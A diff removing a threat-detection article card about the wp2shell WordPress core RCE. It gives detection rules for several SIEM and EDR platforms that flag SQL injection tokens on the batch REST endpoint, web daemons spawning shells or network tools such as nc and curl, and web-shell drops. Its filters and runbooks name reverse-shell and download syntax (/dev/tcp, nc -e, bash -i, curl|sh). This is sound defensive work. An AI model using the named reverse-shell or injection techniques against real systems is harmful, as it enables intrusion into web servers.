@@ -1,504 +1,3 @@
-<article class="card" id="art-212" data-art-slug="2026-07-17-unauthenticated-rce-in-wordpress-core-wp2shell-via-sql-injec"
-  data-phases="actions,c2,exploit,install,recon" data-sev="crit"
-  data-techs="T1021.001,T1027,T1190,T1555.003"
-  data-sources="Aikido"
-  data-platforms="datadog,def,falcon,sent,sigma,spl"
-  data-splunk-cats="application,endpoint,web"
-  data-targets="web-app,windows"
-  data-uc-count="5" data-llm-uc-count="3"
-  data-search="Unauthenticated RCE in WordPress core (wp2shell), via SQL injection WordPress core has an unauthenticated RCE (wp2shell), confirmed as SQL injection. Update to 7.0.2 or 6.9.5 now, with mitigations if you can&#x27;t patch yet. Block the attack class at runtime with Aikido Zen. Category: Vulnerabilities &amp; Threats CVE-2026-60137 CVE-2026-63030 T1021.001 T1027 T1190 T1555.003 [LLM] WordPress wp2shell batch REST API pre-auth RCE exploitation (CVE-2026-63030/60137) [LLM] Web server daemon (php-fpm/apache/nginx/w3wp) spawning a shell or network tool — wp2shell post-exploit code execution [LLM] New PHP file written into WordPress web root by a web daemon — wp2shell web shell drop Asset exposure — vulnerability matches article CVE(s) PowerShell encoded / obfuscated command">
-  <div class="sev-ribbon crit">Critical</div>
-  <button class="share-btn card-share" data-share-art="2026-07-17-unauthenticated-rce-in-wordpress-core-wp2shell-via-sql-injec" title="Copy share link to this article" aria-label="Copy share link">
-    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-  </button>
-  <h2><a href="https://www.aikido.dev/blog/unauthenticated-rce-in-wordpress-wp2shell" target="_blank" rel="noopener">Unauthenticated RCE in WordPress core (wp2shell), via SQL injection</a></h2>
-  <div class="source-badges"><span class="source-badge ">Aikido</span></div>
-  <div class="pubmeta">
-    <span>2026-07-17</span>
-    <span>5 use cases</span>
-    <span>4 techniques</span>
-    <span>5 kill-chain phases detected</span>
-  </div>
-  <p class="summary">WordPress core has an unauthenticated RCE (wp2shell), confirmed as SQL injection. Update to 7.0.2 or 6.9.5 now, with mitigations if you can&#x27;t patch yet. Block the attack class at runtime with Aikido Zen. Category: Vulnerabilities &amp; Threats</p>
-  <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-60137</span> <span class="ind cve">CVE-2026-63030</span></div>
-<div class="ind-group"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Remote Desktop Protocol">T1021.001</span> <span class="ind tech" title="Obfuscated Files or Information">T1027</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Credentials from Web Browsers">T1555.003</span></div>
-  <div class="action-row">
-    <button class="btn btn-kc" data-target="art-212-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
-    <button class="btn btn-hunt" data-hunt-art="art-212"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
-    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
-  </div>
-  <div class="killchain" id="art-212-kc">
-  <div class="kc3d"><div class="kc-cell hit">
-  <div class="num">Phase 1</div>
-  <div class="name">Reconnaissance</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell ">
-  <div class="num">Phase 2</div>
-  <div class="name">Weaponization</div>
-  <div class="marker">—</div>
-</div>
-<div class="kc-cell ">
-  <div class="num">Phase 3</div>
-  <div class="name">Delivery</div>
-  <div class="marker">—</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 4</div>
-  <div class="name">Exploitation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 5</div>
-  <div class="name">Installation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 6</div>
-  <div class="name">Command &amp; Control</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 7</div>
-  <div class="name">Actions on Objectives</div>
-  <div class="marker">Detected</div>
-</div></div>
-  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ Asset exposure — vulnerability matches article CVE(s)</em></div>
-<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
-<div class="phase-line "><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
-<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] WordPress wp2shell batch REST API pre-auth RCE exploitation (CVE-2026-63030/60137) · [LLM] Web server daemon (php-fpm/apache/nginx/w3wp) spawning a shell or network tool — wp2shell post-exploit code execution · PowerShell encoded / obfuscated command</em></div>
-<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] New PHP file written into WordPress web root by a web daemon — wp2shell web shell drop</em></div>
-<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking.</div>
-<div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage.</div></div>
-</div>
-  <div class="usecases"><details class="uc" data-uc-slug="043e6bbe1c" data-platforms="sent,sigma,spl" data-targets="web-app" open>
-  <summary>
-    <span class="uc-title">WordPress wp2shell batch REST API pre-auth RCE exploitation (CVE-2026-63030/60137)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="043e6bbe1c" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Hunts unauthenticated HTTP requests to the WordPress core REST batch endpoint /wp-json/batch/v1 (or rest_route=/batch/v1) that carry the batch-route-confusion + author_exclude/author__not_in SQL injection used by the wp2shell pre-auth RCE. Article-specific: anchors on the exact entry-point path plus the injected SQLi parameter and time-based payload tokens.
-
-Rationale: Anchors on the verbatim article/PoC strings: entry path /wp-json/batch/v1 and rest_route=/batch/v1 (Code Block 1/2) plus the SQLi injection parameter author_exclude/author__not_in and time-based SLEEP() payload confirmed by the Searchlight write-up and the public detection PoC. Endpoint + non-GET method + SQLi token is very low FP.
-
-Cross-checked against:
-  • https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/
-  • https://github.com/Senanfurkan/wordpress-cve-2026-63030
-  • https://thehackernews.com/2026/07/new-wp2shell-wordpress-core-flaw-lets.html
-  • https://securityonline.info/wordpress-pre-auth-rce-cve-2026-63030/</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Server Software Component: Web Shell">T1505.003</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate first-party plugins/mobile apps that batch REST calls through /wp-json/batch/v1 (no SQLi tokens present, so the SQLi selection filters them)</li><li>Internal vulnerability scanners (Nuclei/Nessus/wp2shell.com checker) probing the batch route from known scanner IPs</li><li>Security researchers or the site owner testing exposure with the published PoC</li><li>WAF/CDN health checks that touch REST routes but not the batch endpoint with injection params</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (src IN (&quot;10.0.0.0/8&quot;) AND like(user_agent,&quot;%HealthCheck%&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: pull all requests to /batch/v1 from the source IP over the prior 24h; check scStatus (200 with post-shaped response body indicates the route-confusion succeeded) and confirm the target WordPress version is &lt; 6.9.5 / &lt; 7.0.2. 2) Contain: block /wp-json/batch/v1 and rest_route=/batch/v1 at the WAF/CDN, force the site to 7.0.2 (or 6.9.5), and rotate DB credentials if injection returned data. 3) Hunt: pivot to UC2/UC3 on the same host — look for web-daemon-spawned shells and newly written .php files under wp-content/ within minutes of the request.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-212-uc0-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-212-uc0-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-212-uc0-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-212-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>union isfuzzy=true
-(W3CIISLog
-| where TimeGenerated &gt; ago(7d)
-| where csUriStem has &quot;/batch/v1&quot; or csUriQuery has &quot;rest_route=/batch/v1&quot;
-| where csMethod in~ (&quot;POST&quot;,&quot;PUT&quot;,&quot;PATCH&quot;,&quot;DELETE&quot;) or csUriQuery has_any (&quot;author_exclude&quot;,&quot;author__not_in&quot;,&quot;SLEEP(&quot;,&quot;NOT IN&quot;)
-| project TimeGenerated, Host=Computer, SrcIp=cIP, Method=csMethod, UriStem=csUriStem, UriQuery=csUriQuery, Status=scStatus, UserAgent=csUserAgent, Site=sSiteName),
-(AppServiceHTTPLogs
-| where TimeGenerated &gt; ago(7d)
-| where CsUriStem has &quot;/batch/v1&quot; or CsUriQuery has &quot;rest_route=/batch/v1&quot;
-| where CsMethod in~ (&quot;POST&quot;,&quot;PUT&quot;,&quot;PATCH&quot;,&quot;DELETE&quot;) or CsUriQuery has_any (&quot;author_exclude&quot;,&quot;author__not_in&quot;,&quot;SLEEP(&quot;,&quot;NOT IN&quot;)
-| project TimeGenerated, Host=CsHost, SrcIp=CIp, Method=CsMethod, UriStem=CsUriStem, UriQuery=CsUriQuery, Status=ScStatus, UserAgent=UserAgent, Site=CsHost)
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-212-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: WordPress wp2shell Batch REST API Pre-Auth RCE Exploitation Attempt
-id: 8f3b2c19-6d4a-4e21-9a17-3c5e8b1d7a02
-status: experimental
-description: Detects HTTP requests to the WordPress core REST batch endpoint (/wp-json/batch/v1 or rest_route=/batch/v1) carrying author_exclude/author__not_in SQL injection tokens used by the wp2shell pre-auth RCE (CVE-2026-63030 + CVE-2026-60137).
-references:
-  - https://www.aikido.dev/blog/unauthenticated-rce-in-wordpress-wp2shell
-  - https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/
-author: SOC Detection Engineering
-date: 2026/07/18
-tags:
-  - attack.initial_access
-  - attack.t1190
-  - attack.t1505.003
-logsource:
-  category: webserver
-detection:
-  selection_path:
-    - cs-uri-stem|contains: &#x27;/batch/v1&#x27;
-    - cs-uri-query|contains: &#x27;rest_route=/batch/v1&#x27;
-  selection_sqli:
-    - cs-uri-query|contains: &#x27;author_exclude&#x27;
-    - cs-uri-query|contains: &#x27;author__not_in&#x27;
-    - cs-uri-query|contains: &#x27;SLEEP(&#x27;
-  condition: selection_path and selection_sqli
-falsepositives:
-  - Legitimate applications performing bulk operations through the REST batch endpoint (rare, and would not carry SQLi tokens)
-level: high</code></pre></div>
-    <div class="tab-content" id="art-212-uc0-spl"><span class="splunk-cat-pill splunk-cat-web" title="Splunk-research detection category">WEB</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-212-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-212-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-212-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Web where (Web.uri_path=&quot;*/batch/v1*&quot; OR Web.url=&quot;*/wp-json/batch/v1*&quot; OR Web.uri_query=&quot;*rest_route=/batch/v1*&quot;) by Web.src, Web.dest, Web.site, Web.http_method, Web.uri_path, Web.uri_query, Web.url, Web.status, Web.http_user_agent
-| `drop_dm_object_name(&quot;Web&quot;)`
-| where http_method IN (&quot;POST&quot;,&quot;PUT&quot;,&quot;PATCH&quot;,&quot;DELETE&quot;) OR like(uri_query,&quot;%author_exclude%&quot;) OR like(uri_query,&quot;%author__not_in%&quot;) OR like(url,&quot;%author_exclude%&quot;) OR like(url,&quot;%SLEEP(%&quot;) OR like(uri_query,&quot;%NOT IN%&quot;)
-| convert ctime(firstTime) ctime(lastTime)
-| sort - lastTime</code></pre><pre class="spl-mode-body" id="art-212-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Web where (Web.uri_path=&quot;*/batch/v1*&quot; OR Web.url=&quot;*/wp-json/batch/v1*&quot; OR Web.uri_query=&quot;*rest_route=/batch/v1*&quot;) by Web.src, Web.dest, Web.site, Web.http_method, Web.uri_path, Web.uri_query, Web.url, Web.status, Web.http_user_agent
-| `drop_dm_object_name(&quot;Web&quot;)`
-| where http_method IN (&quot;POST&quot;,&quot;PUT&quot;,&quot;PATCH&quot;,&quot;DELETE&quot;) OR like(uri_query,&quot;%author_exclude%&quot;) OR like(uri_query,&quot;%author__not_in%&quot;) OR like(url,&quot;%author_exclude%&quot;) OR like(url,&quot;%SLEEP(%&quot;) OR like(uri_query,&quot;%NOT IN%&quot;)
-| convert ctime(firstTime) ctime(lastTime)
-| sort - lastTime</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="a3c8ba7135" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">Web server daemon (php-fpm/apache/nginx/w3wp) spawning a shell or network tool — wp2shell post-exploit code execution</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="a3c8ba7135" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Hunts the post-exploitation stage of the wp2shell RCE: a WordPress web worker (php-fpm, apache2/httpd, nginx, or IIS w3wp/php-cgi) spawning an interactive shell or egress tool (sh/bash, nc/ncat, curl/wget, python/perl, cmd/powershell). Article-specific because the flaw yields arbitrary code execution under the web user with no plugin involved.
-
-Rationale: Article states the flaw &#x27;chains into remote code execution&#x27; against a stock install under the web user; the highest-fidelity host signal for that is a WordPress web daemon (php-fpm/apache/nginx/w3wp) parenting a shell or egress binary — a parent+child pairing that is abnormal for a web server. Parent set is WordPress-specific, not a generic LOLBin template.
-
-Cross-checked against:
-  • https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/
-  • https://thehackernews.com/2026/07/new-wp2shell-wordpress-core-flaw-lets.html</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>WordPress plugins that legitimately call exec()/shell_exec() (e.g. image optimizers invoking convert, backup plugins invoking mysqldump/tar)</li><li>WP-Cron or deploy hooks running via php-fpm that shell out to curl/wget for remote fetches</li><li>Server management panels (Plesk/cPanel) whose PHP workers spawn shells for admin tasks</li><li>CI/CD or WP-CLI automation executed under the web account during scheduled maintenance</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where ProcessCommandLine has_any (&quot;/dev/tcp&quot;,&quot;-i&quot;,&quot;bash -c&quot;,&quot;sh -c&quot;,&quot;-e /bin&quot;,&quot;base64 -d&quot;,&quot;|sh&quot;,&quot;| sh&quot;,&quot;IEX&quot;,&quot;-nop&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: inspect the child ProcessCommandLine for reverse-shell/download syntax (/dev/tcp, nc -e, bash -i, curl|sh) and correlate the timestamp against UC1 batch-endpoint hits on the same host. 2) Contain: isolate the host, kill the offending php-fpm/worker child tree, and pull the box out of the load balancer. 3) Hunt: enumerate files written by that PID (UC3) and outbound connections from the web daemon; capture bash history and /tmp for staged payloads.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-212-uc1-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-212-uc1-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-212-uc1-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-212-uc1-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-212-uc1-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-212-uc1-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-212-uc1-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName in~ (&quot;httpd&quot;,&quot;apache2&quot;,&quot;nginx&quot;,&quot;php-fpm&quot;,&quot;php-fpm7.4&quot;,&quot;php-fpm8.0&quot;,&quot;php-fpm8.1&quot;,&quot;php-fpm8.2&quot;,&quot;php-fpm8.3&quot;,&quot;w3wp.exe&quot;,&quot;php-cgi.exe&quot;)
-| where FileName in~ (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;netcat&quot;,&quot;curl&quot;,&quot;wget&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;)
-| where AccountName !endswith &quot;$&quot;
-| project Timestamp, DeviceName, AccountName, ParentProc=InitiatingProcessFileName, ParentCmd=InitiatingProcessCommandLine, ChildProc=FileName, ChildCmd=ProcessCommandLine, FolderPath, SHA256
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-212-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
-| where TimeGenerated &gt; ago(7d)
-| where ParentProcessName has_any (&quot;httpd&quot;,&quot;apache2&quot;,&quot;nginx&quot;,&quot;php-fpm&quot;,&quot;w3wp.exe&quot;,&quot;php-cgi.exe&quot;)
-| where ActingProcessName has_any (&quot;/sh&quot;,&quot;/bash&quot;,&quot;/dash&quot;,&quot;/zsh&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;netcat&quot;,&quot;curl&quot;,&quot;wget&quot;,&quot;python&quot;,&quot;perl&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;)
-| project TimeGenerated, Host=DvcHostname, User=ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-212-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: Web Server Daemon Spawning Shell or Network Tool (wp2shell post-exploit)
-id: 2a91c47e-5b83-4d16-8f2a-9e1c6b4d3a11
-status: experimental
-description: Detects a WordPress web worker process (php-fpm, apache2/httpd, nginx, IIS w3wp/php-cgi) spawning an interactive shell or egress tool, indicative of code execution following the wp2shell pre-auth RCE (CVE-2026-63030).
-references:
-  - https://www.aikido.dev/blog/unauthenticated-rce-in-wordpress-wp2shell
-  - https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/
-author: SOC Detection Engineering
-date: 2026/07/18
-tags:
-  - attack.execution
-  - attack.t1059.004
-  - attack.t1190
-logsource:
-  category: process_creation
-detection:
-  selection:
-    ParentImage|endswith:
-      - &#x27;/httpd&#x27;
-      - &#x27;/apache2&#x27;
-      - &#x27;/nginx&#x27;
-      - &#x27;/php-fpm&#x27;
-      - &#x27;\w3wp.exe&#x27;
-      - &#x27;\php-cgi.exe&#x27;
-    Image|endswith:
-      - &#x27;/sh&#x27;
-      - &#x27;/bash&#x27;
-      - &#x27;/dash&#x27;
-      - &#x27;/zsh&#x27;
-      - &#x27;/nc&#x27;
-      - &#x27;/ncat&#x27;
-      - &#x27;/curl&#x27;
-      - &#x27;/wget&#x27;
-      - &#x27;/python&#x27;
-      - &#x27;/python3&#x27;
-      - &#x27;/perl&#x27;
-      - &#x27;\cmd.exe&#x27;
-      - &#x27;\powershell.exe&#x27;
-  condition: selection
-falsepositives:
-  - PHP applications shelling out via exec()/proc_open() for legitimate features (image processing, cron, deploy hooks)
-level: high</code></pre></div>
-    <div class="tab-content" id="art-212-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>source:windows.sysmon @EventID:1 @ParentImage:(*\\w3wp.exe OR *\\W3WP.exe OR *\\php-cgi.exe OR *\\PHP-CGI.exe) @Image:(*\\cmd.exe OR *\\CMD.exe OR *\\powershell.exe OR *\\PowerShell.exe OR *\\nc.exe OR *\\ncat.exe OR *\\curl.exe OR *\\wget.exe)</code></pre></div>
-    <div class="tab-content" id="art-212-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2
-| ParentBaseFileName=/(httpd|apache2|nginx|php-fpm|w3wp\.exe|php-cgi\.exe)/i
-| ImageFileName=/(\/(sh|bash|dash|zsh|nc|ncat|netcat|curl|wget|python3?|perl)$|\\(cmd|powershell|pwsh)\.exe$)/i
-| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName], function=count())</code></pre></div>
-    <div class="tab-content" id="art-212-uc1-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-212-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-212-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-212-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN (&quot;httpd&quot;,&quot;apache2&quot;,&quot;nginx&quot;,&quot;php-fpm&quot;,&quot;php-fpm7.4&quot;,&quot;php-fpm8.0&quot;,&quot;php-fpm8.1&quot;,&quot;php-fpm8.2&quot;,&quot;php-fpm8.3&quot;,&quot;w3wp.exe&quot;,&quot;php-cgi.exe&quot;) AND Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;netcat&quot;,&quot;curl&quot;,&quot;wget&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;)) by Processes.dest, Processes.user, Processes.parent_process_name, Processes.parent_process, Processes.process_name, Processes.process
-| `drop_dm_object_name(&quot;Processes&quot;)`
-| convert ctime(firstTime) ctime(lastTime)
-| sort - lastTime</code></pre><pre class="spl-mode-body" id="art-212-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN (&quot;httpd&quot;,&quot;apache2&quot;,&quot;nginx&quot;,&quot;php-fpm&quot;,&quot;php-fpm7.4&quot;,&quot;php-fpm8.0&quot;,&quot;php-fpm8.1&quot;,&quot;php-fpm8.2&quot;,&quot;php-fpm8.3&quot;,&quot;w3wp.exe&quot;,&quot;php-cgi.exe&quot;) AND Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;netcat&quot;,&quot;curl&quot;,&quot;wget&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;)) by Processes.dest, Processes.user, Processes.parent_process_name, Processes.parent_process, Processes.process_name, Processes.process
-| `drop_dm_object_name(&quot;Processes&quot;)`
-| convert ctime(firstTime) ctime(lastTime)
-| sort - lastTime</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="e2c43821e8" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">New PHP file written into WordPress web root by a web daemon — wp2shell web shell drop</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Installation</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="e2c43821e8" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Hunts web shell persistence following the wp2shell RCE: a WordPress web worker (php-fpm/apache/nginx/w3wp/php-cgi) creating a new .php/.phtml/.php5/.phar file under wp-content, wp-admin, or wp-includes. Article-specific because unauthenticated RCE in core is routinely followed by dropping an attacker PHP payload into the web-accessible tree.
-
-Rationale: WordPress web daemons should not author new PHP files in the web root outside of an update; pairing the web-worker writer (php-fpm/apache/nginx/w3wp) with a fresh .php under wp-content/wp-admin/wp-includes is a high-signal web shell drop for a core RCE that runs as the web user. Web-root paths are WordPress-specific, not a generic file-write template.
-
-Cross-checked against:
-  • https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/
-  • https://www.cryptika.com/new-wp2shell-rce-vulnerability-hits-millions-of-wordpress-sites-emergency-patch-released/</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Server Software Component: Web Shell">T1505.003</span> <span class="ind tech" title="Ingress Tool Transfer">T1105</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Filesystem</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>WordPress core auto-update to 6.9.5/7.0.2 rewriting bundled PHP files (expected right now given forced auto-updates)</li><li>Plugin/theme installation or update from the admin dashboard writing PHP into wp-content/plugins or /themes</li><li>Caching plugins (WP Super Cache/W3 Total Cache) generating advanced-cache.php or object-cache.php drop-ins</li><li>Backup/restore or staging-sync tooling repopulating the web root</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where InitiatingProcessCommandLine !has &quot;wp-cron&quot; and FolderPath !has &quot;cache&quot; and not (FileName in~ (&quot;object-cache.php&quot;,&quot;advanced-cache.php&quot;,&quot;db.php&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: read the created file — flag short files containing eval/base64_decode/system/assert/$_REQUEST/$_POST/preg_replace(/e); compare the writer PID and timestamp against UC1 batch-endpoint requests and known update windows. 2) Contain: quarantine the file (do not delete before imaging), block web access to it, and isolate the host if the content is a shell. 3) Hunt: enumerate all files touched by the same PID/session, review access logs for GET/POST hits on the new filename, and check for scheduled tasks or wp_options/wp_users tampering.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-212-uc2-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-212-uc2-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-212-uc2-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-212-uc2-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-212-uc2-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-212-uc2-spl">Splunk SPL (CIM)</button>
-    </div>
